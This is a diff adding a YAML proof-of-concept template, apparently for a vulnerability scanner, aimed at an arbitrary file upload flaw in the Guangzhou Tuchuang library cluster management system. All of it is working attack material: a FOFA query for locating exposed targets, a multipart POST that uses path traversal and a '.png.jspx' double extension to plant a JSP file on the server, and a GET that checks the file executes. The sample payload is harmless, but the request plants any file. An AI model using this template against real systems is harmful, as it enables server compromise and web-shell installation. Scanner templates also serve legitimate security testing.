@@ -1,0 +1,34 @@
+id: poc-yaml-guangzhou-tuchuang-pictureupload-anyfile-upload
+info:
+  name: 广州图创 图书馆集群管理系统 PictureUpload 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 图书馆集群管理系统
+  fofa: app="TCSOFT-图书馆集群管理系统"
+variables:
+  t1: random_str(5)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /interlib/loan/PictureUpload
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+  data: "------WebKitFormBoundaryFfJZ4PlAZBixjELj\nContent-Disposition: form-data;\
+    \ name=\"/../{{.t1}}\"; filename=\"{{.t1}}.png.jspx\"\nContent-Type: image/png\n\
+    \n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\"\
+    \ version=\"2.0\">\n  <jsp:directive.page contentType=\"text/plain\" pageEncoding=\"\
+    UTF-8\"/>{{.t2}}\n</jsp:root>\n------WebKitFormBoundaryFfJZ4PlAZBixjELj--"
+  expression: 'status_code == 200 &&
+
+    contains(body,"文件上传成功，图片压缩后文件大小为0K") &&
+
+    contains(body,"<ISUPLOADED>true</ISUPLOADED>") &&
+
+    contains(body,"jspx")
+
+    '
+- method: GET
+  path: /interlib/{{.t1}}.png.jspx
+  expression: status_code == 200 && trim(body) == t2
+transport: http
